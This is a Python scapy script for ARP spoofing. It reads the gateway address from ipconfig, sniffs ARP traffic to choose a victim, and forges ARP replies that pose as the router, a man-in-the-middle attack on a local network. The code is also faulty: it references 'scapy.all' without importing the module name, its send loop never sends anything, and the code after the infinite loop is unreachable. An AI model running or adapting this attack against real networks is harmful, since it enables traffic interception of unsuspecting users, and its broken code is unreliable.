from scapy.all import *
import os
LAN_TYPE = "WIFI" # Can be either ETHERNET or WIFI

class LAN():
    def __init__(self, LAN_TYPE = "WIFI"):
        '''The function is used as constructor of the LAN object'''
        self.LAN_TYPE = LAN_TYPE # Can be either ETHERNET or WIFI. Default is set to WIFI
        self.victim_IP = ""
        self.victim_MAC = ""
        self.spoofed_MAC = scapy.all.Ether().src
        self.defaultGateway = self.get_defaultGateway()
        self.find_arp()
        self.run()

    def get_defaultGateway(self):
        '''The following function returns the default gateway IP address'''
        # The function relies on the ipconfig function.
        # It can work on either ethernet or wifi according to the LAN_TYPE parameter
        f = str(os.popen("ipconfig /all").read())
        if (self.LAN_TYPE == "ETHERNET"):
            f = (f[f.find("Default Gateway")::])
            ipv = f[f.find(":") + 2:f.find("\n")]
            if(":" in ipv):
                f = f[f.find("\n")+1::].strip(" ")
                return f[0:f.find("\n")]
            return ipv
        elif (self.LAN_TYPE == "WIFI"):
            f = f[f.find("Wireless LAN adapter Wi-Fi")::]
            f = (f[f.find("Default Gateway")::])
            ipv = f[f.find(":") + 2:f.find("\n")]
            if (":" in ipv):
                f = f[f.find("\n")+1::].strip(" ")
                return f[0:f.find("\n")]
            return ipv

        else:
            raise Exception("LAN type is not recognizable")

    def find_arp(self):
        '''The following function finds a target using scapy's sniffing'''
        # lfilter: finds arp packets sent (who has gateway's ip)
        # count: needs only one packet
        # prn: updates the ip and mac address of the victim
        arp_packet = scapy.all.sniff(lfilter = self.ARP_Gateway, count = 1, prn = self.update_ARP)

    def __str__(self):
        '''Overriding toString'''
        return f"victim_IP: {self.victim_IP}\nvictim_MAC: {self.victim_MAC}\nspoofed_MAC: {self.spoofed_MAC}\ndefaultGateway: {self.defaultGateway}"

    def ARP_Gateway(self,packet):
        '''The following function is used as a filter to find a packet sent to the gateway (router)'''
        if scapy.all.ARP in packet:
            if packet[scapy.all.ARP].pdst == self.defaultGateway:
                    return packet

    def update_ARP(self, packet):
        '''The following function is used as the prn of the sniffing function to update the victim's data (ip,mac)'''
        self.victim_IP = packet[scapy.all.ARP].psrc
        self.victim_MAC = packet[scapy.all.ARP].hwsrc

    def run(self):
        '''The function starts the process of ARP SPOOFING (sends a spoofed packet)'''
        #scapy.all.send(gratuituous_ALICE)
        while True:
            ALICE = scapy.all.ARP(op=1, psrc = self.defaultGateway, hwsrc = self.spoofed_MAC, pdst = self.victim_IP, hwdst="00:00:00:00:00:00")
            time.sleep(0.2)
            print("1")
        ALICE = scapy.all.ARP(op=2 , pdst = self.victim_IP, hwsrc = self.spoofed_MAC, psrc = self.defaultGateway)
        scapy.all.send(ALICE)
        BOB = scapy.all.ARP(op=2 , pdst = self.defaultGateway, hwsrc = self.spoofed_MAC, psrc = self.victim_IP)
        #scapy.all.send(BOB)



if __name__ == '__main__':
    l = LAN()
    #print(l)



